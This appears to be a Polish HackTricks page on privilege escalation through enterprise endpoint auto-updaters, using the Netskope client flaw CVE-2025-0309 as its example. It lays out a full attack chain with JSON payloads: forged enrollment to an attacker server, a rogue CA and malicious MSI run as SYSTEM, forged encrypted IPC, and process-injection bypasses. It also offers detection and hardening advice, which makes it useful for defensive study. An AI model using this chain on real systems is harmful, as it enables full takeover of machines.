# Nadużywanie Enterprise Auto-Updaters i uprzywilejowanego IPC (np. Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów Windows local privilege escalation znalezionych w enterprise endpoint agents i updaterach, które udostępniają niskotarciową powierzchnię IPC i uprzywilejowany flow aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), gdzie użytkownik o niskich uprawnieniach może wymusić enrollment do serwera kontrolowanego przez atakującego, a następnie dostarczyć złośliwe MSI, które instaluje usługa SYSTEM.

Kluczowe pomysły, które możesz ponownie użyć przeciw podobnym produktom:
- Nadużyj localhost IPC uprzywilejowanej usługi, aby wymusić ponowny re‑enrollment lub rekonfigurację do serwera atakującego.
- Zaimplementuj vendor’s update endpoints, dostarcz złośliwy Trusted Root CA i wskaż updaterowi złośliwy, „podpisany” pakiet.
- Obejść słabe kontrole podpisującego (CN allow‑lists), opcjonalne flagi digest i luźne właściwości MSI.
- Jeśli IPC jest „zaszyfrowane”, wyprowadź key/IV z ogólnodostępnych identyfikatorów maszyny zapisanych w rejestrze.
- Jeśli usługa ogranicza callerów według image path/process name, wstrzyknij do allow‑listowanego procesu lub uruchom go w stanie suspended i bootstrapuj swój DLL przez minimalną łatkę thread‑context.

---
## 1) Wymuszanie rejestracji do serwera atakującego przez localhost IPC

Wiele agentów dostarcza proces UI w user‑mode, który komunikuje się z usługą SYSTEM przez localhost TCP używając JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg exploitu:
1) Stwórz JWT enrollment token, którego claims kontrolują backend host (np. AddonUrl). Użyj alg=None, więc nie jest wymagany żaden podpis.
2) Wyślij IPC message wywołujący provisioning command z Twoim JWT i tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Usługa zaczyna łączyć się z twoim fałszywym serwerem w celu rejestracji/konfiguracji, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Jeśli weryfikacja wywołującego opiera się na ścieżce/nazwie, wygeneruj żądanie z dozwolonego binarnego pliku dostawcy (zob. §4).

---
## 2) Przejęcie kanału aktualizacji w celu uruchomienia kodu jako SYSTEM

Gdy klient połączy się z twoim serwerem, zaimplementuj oczekiwane endpointy i skieruj go do złośliwego MSI. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć konfigurację JSON z bardzo krótkim interwałem aktualizatora, np.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Zwraca PEM CA certificate. Serwis instaluje go do Local Machine Trusted Root store.
3) /v2/checkupdate → Dostarcza metadane wskazujące na złośliwe MSI i fałszywą wersję.

Omijanie powszechnych kontroli spotykanych w naturze:
- Signer CN allow‑list: serwis może jedynie sprawdzać czy Subject CN = “netSkope Inc” lub “Netskope, Inc.”. Twoje złośliwe CA może wystawić certyfikat leaf z tym CN i podpisać MSI.
- CERT_DIGEST property: dołącz benign MSI property o nazwie CERT_DIGEST. Brak egzekwowania przy instalacji.
- Optional digest enforcement: flaga konfiguracyjna (np. check_msi_digest=false) wyłącza dodatkową walidację kryptograficzną.

Rezultat: usługa SYSTEM instaluje Twoje MSI z
C:\ProgramData\Netskope\stAgent\data\*.msi
wykonując dowolny kod jako NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Od R127, Netskope opakował IPC JSON w pole encryptData, które wygląda jak Base64. Reverse engineering wykazał AES z kluczem/IV wyprowadzonym z wartości rejestru czytelnych dla dowolnego użytkownika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać poprawne zaszyfrowane polecenia z poziomu zwykłego użytkownika. Ogólna wskazówka: jeśli agent nagle „szyfruje” swoje IPC, szukaj device ID, product GUID, install ID w HKLM jako materiału do klucza.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Niektóre usługi próbują uwierzytelnić peer poprzez rozwiązywanie PID połączenia TCP i porównanie ścieżki/nazwy obrazu z listą dozwolonych binarek vendorowych umieszczonych w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne obejścia:
- DLL injection do procesu z listy dozwolonych (np. nsdiag.exe) i proxy IPC z jego wnętrza.
- Uruchomienie allow‑listed binarki w stanie suspended i załadowanie własnego proxy DLL bez CreateRemoteThread (zob. §5), aby spełnić reguły wymuszane przez driver.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Produkty często dostarczają minifilter/OB callbacks driver (np. Stadrv), który usuwa niebezpieczne prawa z uchwytów do chronionych procesów:
- Process: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ogranicza do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny loader w user‑mode, który respektuje te ograniczenia:
1) CreateProcess vendor binary z CREATE_SUSPENDED.
2) Uzyskaj uchwyty, na które nadal masz prawo: PROCESS_VM_WRITE | PROCESS_VM_OPERATION do procesu oraz uchwyt wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (lub tylko THREAD_RESUME jeśli łatasz kod przy znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, gwarantowany‑mapped thunk) małym stubem, który wywołuje LoadLibraryW na ścieżce Twojego DLL, a następnie skacze z powrotem.
4) ResumeThread, aby uruchomić stub w procesie i załadować Twój DLL.

Ponieważ nigdy nie użyłeś PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME na już‑chronionym procesie (ty go utworzyłeś), polityka drivera jest spełniona.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatyzuje rogue CA, podpisanie złośliwego MSI i serwuje potrzebne endpointy: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope to custom IPC client, który tworzy arbitralne (opcjonalnie AES‑szyfrowane) IPC messages i zawiera suspended‑process injection, aby pochodzić z allow‑listed binary.

---
## 7) Detection opportunities (blue team)
- Monitoruj dodatki do Local Machine Trusted Root. Sysmon + registry‑mod eventing (zob. SpecterOps guidance) działa dobrze.
- Oznaczaj wykonania MSI inicjowane przez usługę agenta z lokalizacji takich jak C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Przeglądaj logi agenta pod kątem nieoczekiwanych hostów/tenantów rejestracji, np.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – szukaj addonUrl / tenant anomalii oraz provisioning msg 148.
- Alertuj na localhost IPC clients, które nie są oczekiwanymi signed binaries lub które pochodzą z nietypowych drzew procesów potomnych.

---
## Hardening tips for vendors
- Powiąż enrollment/update hosts ze ścisłą allow‑listą; odrzucaj nieufne domeny w clientcode.
- Uwierzytelniaj IPC peers przy użyciu OS primitives (ALPC security, named‑pipe SIDs) zamiast sprawdzania ścieżki/nazwy obrazu.
- Trzymaj tajne materiały poza world‑readable HKLM; jeśli IPC musi być szyfrowane, wyprowadzaj klucze z chronionych sekretów lub negocjuj je przez authenticated channels.
- Traktuj updater jako surface supply‑chain: wymagaj pełnego chain do trusted CA, którą kontrolujesz, weryfikuj podpisy pakietów względem pinned keys i fail closed jeśli walidacja jest wyłączona w konfiguracji.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
